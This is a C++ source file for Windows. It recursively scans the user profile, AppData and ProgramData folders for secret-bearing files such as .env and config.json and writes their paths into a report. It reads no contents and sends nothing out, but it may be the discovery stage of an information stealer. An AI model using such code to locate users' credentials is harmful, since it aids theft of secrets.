#include "config_collector.h"
#include <Windows.h>
#include <shlobj.h>
#include <iostream>
#include <sstream>
#include <filesystem>
#include <vector>

std::string ConfigCollector::CollectConfigs() {
    std::ostringstream result;
    result << "\n=== CONFIG FILES ===\n";
    
    char userprofile[MAX_PATH], appdata[MAX_PATH], programdata[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, SHGFP_TYPE_CURRENT, userprofile);
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appdata);
    SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, SHGFP_TYPE_CURRENT, programdata);
    
    std::vector<std::string> patterns = {".env", "config.json", "settings.ini", "config.ini", "configuration.json"};
    std::vector<std::string> searchPaths = {userprofile, appdata, programdata};
    
    int foundCount = 0;
    for (const auto& searchPath : searchPaths) {
        for (const auto& pattern : patterns) {
            try {
                for (auto& p : std::filesystem::recursive_directory_iterator(searchPath)) {
                    if (p.is_regular_file()) {
                        std::string filename = p.path().filename().string();
                        if (filename.find(pattern) != std::string::npos) {
                            result << "Found: " << p.path().string() << "\n";
                            foundCount++;
                            if (foundCount > 50) break;
                        }
                    }
                }
            } catch (...) {
                // Skip access denied
            }
            if (foundCount > 50) break;
        }
        if (foundCount > 50) break;
    }
    
    result << "Total configs found: " << foundCount << "\n";
    
    return result.str();
}
